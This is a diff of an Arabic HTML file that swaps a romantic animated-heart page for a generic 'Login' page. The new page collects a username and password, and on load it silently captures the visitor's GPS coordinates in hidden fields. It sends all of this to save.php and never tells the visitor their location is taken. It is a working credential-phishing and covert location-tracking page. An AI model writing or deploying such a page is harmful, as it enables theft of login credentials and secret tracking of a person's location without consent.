@@ -1,72 +1,29 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>عسوله احبج 💖</title>
-<style>
-  body {
-    background-color: #ffe6f0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    flex-direction: column;
-    font-family: 'Arial', sans-serif;
+<title>تسجيل الدخول</title>
+<script>
+function sendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      document.getElementById('lat').value = position.coords.latitude;
+      document.getElementById('lon').value = position.coords.longitude;
+    });
   }
-
-  .text {
-    font-size: 24px;
-    color: #ff1a75;
-    margin-bottom: 40px; /* زدت المسافة هنا */
-    font-weight: bold;
-    animation: fade 2s infinite alternate;
-  }
-
-  .heart {
-    width: 100px;
-    height: 100px;
-    background-color: #ff4d88;
-    position: relative;
-    transform: rotate(-45deg);
-    animation: pulse 1s infinite;
-  }
-
-  .heart::before,
-  .heart::after {
-    content: "";
-    width: 100px;
-    height: 100px;
-    background-color: #ff4d88;
-    border-radius: 50%;
-    position: absolute;
-  }
-
-  .heart::before {
-    top: -50px;
-    left: 0;
-  }
-
-  .heart::after {
-    left: 50px;
-    top: 0;
-  }
-
-  @keyframes pulse {
-    0% { transform: rotate(-45deg) scale(1); }
-    50% { transform: rotate(-45deg) scale(1.1); }
-    100% { transform: rotate(-45deg) scale(1); }
-  }
-
-  @keyframes fade {
-    from { opacity: 0.6; }
-    to { opacity: 1; }
-  }
-</style>
+}
+window.onload = sendLocation;
+</script>
 </head>
 <body>
-
-<div class="text">عسوله احبج 💖</div>
-<div class="heart"></div>
-
+<h2>تسجيل الدخول</h2>
+<form action="save.php" method="POST">
+  <input type="text" name="username" placeholder="اسم المستخدم" required><br><br>
+  <input type="password" name="password" placeholder="كلمة المرور" required><br><br>
+  <input type="hidden" name="lat" id="lat">
+  <input type="hidden" name="lon" id="lon">
+  <button type="submit">دخول</button>
+</form>
 </body>
 </html>
